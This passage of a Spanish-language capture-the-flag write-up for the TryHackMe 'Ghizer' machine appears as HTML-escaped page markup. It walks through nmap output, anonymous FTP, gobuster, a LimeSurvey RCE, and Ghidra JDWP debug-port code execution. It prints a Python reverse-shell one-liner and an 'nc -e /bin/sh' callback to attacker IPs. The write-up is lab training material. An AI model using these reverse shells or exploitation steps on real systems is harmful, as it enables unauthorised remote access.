+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:s\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:with\x20USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GetRequest,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20login\x20with\x20USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HTTPOptions,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n5
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:30\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RTSPReques
+SF:t,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x2
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:03\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+SF:%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPCCheck,33,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:(vsFTPd\x203\.0\.3\)\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DNSVersionBindReqTCP,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20t
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:o\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20login\x20with\x20USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DNSStatusRequestTCP,58
+SF:,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;S
+SF:SLSessionReq,33,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\(vsFTPd\x203\.0\.3\)\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TerminalServerCookie,33,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TLSSess
+SF:ionReq,33,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFT
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:Pd\x203\.0\.3\)\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Kerberos,33,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x2
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBProgNeg,33,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Wel
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:come\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r
+SF:&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;X11Probe,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(v
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:sFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PA
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:SS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FourOhFourRequest,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20F
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:TP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\x
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
+&lt;p&gt;Ingresamos por el servicio FTP con las credenciales de anonymous (anonymous:anonymous) en el cual encontramos varios archivos entre ellos las flag &lt;code&gt;root.txt&lt;/code&gt; y &lt;code&gt;user.txt&lt;/code&gt;, al intentar obtener uno de estos archivos muestra un mensaje de permiso denegado por lo que no logramos hacer nada en este servicio, además es muy raro porque comunmente es posible realizar &lt;code&gt;ls -lah&lt;/code&gt; para observar los archivos ocultos, algo que no se pudo lograr en este servicio.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/ghizer$ ftp ghizer.thm 
+Connected to ghizer.thm.
+&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; Welcome to Anonymous FTP server &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ghizer.thm:kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: anonymous
+&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
+Password:
+&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
+Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls
+&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
+&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
+-r-x------    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;1351&lt;/span&gt;  Feb &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; client.py
+-r-x------    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;54324&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; test.c
+-r-x------    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt;  Nov &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; prototype.c
+-rwx------    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt;  Jan &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; root.txt
+-r-x------    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;45550&lt;/span&gt; Dec &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; user.txt
+-r-x------    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;45550&lt;/span&gt; Dec &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; i_honeypot.py
+&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
+ftp&amp;gt; get user.txt
+local: user.txt remote: user.txt
+Permission denied.
+&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
+&lt;span class=&#34;m&#34;&gt;550&lt;/span&gt; Permission denied.
+ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;257&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/home/lucrecia/ftp/&amp;#34;&lt;/span&gt; is the current directory
+ftp&amp;gt; get root.txt
+local: root.txt remote: root.txt
+Permission denied.
+&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
+&lt;span class=&#34;m&#34;&gt;550&lt;/span&gt; Permission denied.
+ftp&amp;gt; bye
+&lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
+kali@kali:~/thm/ghizer$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
+&lt;p&gt;Encontramos una pagina web en el puerto 80, al parecer es una aplicacion web para realizar encuestas.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_02-30-16.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
+&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/ghizer$ gobuster dir -u http://ghizer.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt; -x php,html,txt
+/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/docs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/themes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/admin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/assets &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/upload &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/tests &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/plugins &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/application &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/tmp &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/framework &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/locale &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/installer &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/third_party &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;limesurvey---rce&#34;&gt;LimeSurvey - RCE&lt;/h2&gt;
+&lt;p&gt;Encontramos un exploit que afecta a esta aplicacion la cual necesita unas credenciales para subir una shell y ejecutar comandos, utilizamos las credenciales por defecto y ejecutamos el exploit con los parametros necesarios. Vemos que el usuario que esta ejecutando la aplicacion es &lt;code&gt;www-data&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_02-35-02.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Actualizamos a una nueva shell en donde podamos realizar una enumeracion más comoda ejecutando una shell inversa de python.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.2.29.162&amp;#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;ghidra-rce---veronica&#34;&gt;GHIDRA RCE -&amp;gt; VERONICA&lt;/h2&gt;
+&lt;p&gt;Realizamos una enumeracion en la maquina y vemos que en el directorio principal de la usuario &lt;code&gt;veronica&lt;/code&gt; esta &lt;code&gt;Ghidra&lt;/code&gt;, además de ello vemos los puertos abiertos en la maquina (ojo con 18001).&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_02-38-15.png&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_02-47-45.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Exploramos las vulnerabilidades en ghidra y al principio vimos el exploit &lt;a href=&#34;https://www.exploit-db.com/exploits/47231&#34;&gt;&lt;strong&gt;Ghidra (Linux) 9.0.4 - .gar Arbitrary Code Execution&lt;/strong&gt;&lt;/a&gt; que necesita un archivo de &lt;code&gt;project.gar&lt;/code&gt; el cual se puede crear en Ghidra a partir de un proyecto, pero este exploit necesita una interaccion con la interfaz visual de Ghidra. Tambien encontramos la vulnerabilidad &lt;code&gt;Remote Code Execution Through JDWP Debug Port&lt;/code&gt; el cual afecta a la version &lt;a href=&#34;https://ghidra-sre.org/releaseNotes_9.0.4.html#9_0_4&#34;&gt;&lt;strong&gt;9.0.4&lt;/strong&gt;&lt;/a&gt;. En esta vulnerabilidad Ghidra abre en modo debug &lt;a href=&#34;https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/jdwp-spec.html&#34;&gt;&lt;strong&gt;JDWP&lt;/strong&gt;&lt;/a&gt; lo cual permite conectarse al puerto 18001 de localhost. Pero qué pasa, no tenemos acceso al puerto local y este tampoco esta expuesto.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_03-12-47.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;tenemos acceso al puerto (18001) localmente en la shell actual por lo que realizamos la explotacion como &lt;a href=&#34;https://www.youtube.com/watch?v=N3VcWIUpgfE&#34;&gt;&lt;strong&gt;demostracion de la exploitacion&lt;/strong&gt;&lt;/a&gt;, a continuacion los comandos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Conexion a jdwp&lt;/span&gt;
+jdb -attach localhost:18001
+&lt;span class=&#34;c1&#34;&gt;#Listar las clases disponibles&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#classpath&lt;/span&gt;
+stop in org.apache.logging.log4j.core.util.WatchManager&lt;span class=&#34;nv&#34;&gt;$WatchRunnable&lt;/span&gt;.run&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#Ejecucion de la shell inversa&lt;/span&gt;
+print new java.lang.Runtime&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;.exec&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nc 10.10.10.10 1337 -e /bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_03-20-39.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Logramos obtener nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_03-36-14.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;p&gt;Hacemos una pequeña enumeracion en la carpeta principal de &lt;code&gt;veronica&lt;/code&gt; y vemos un script en python el cual codifica el mensaje &lt;code&gt;tryhackme is the best&lt;/code&gt; y además la variable podria darnos una pista de lo que debemos de hacer.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base64&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;hijackme&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tryhackme is the best&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hijackme&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Además vemos un cron que ejecuta el usuario root.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-13_21-29-06.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Tambien al realizar &lt;code&gt;sudo -l -l&lt;/code&gt; vemos que podemos ejecutar &lt;code&gt;/usr/bin/python3.5 /home/veronica/base.py&lt;/code&gt; con sudo.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_02-58-02.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
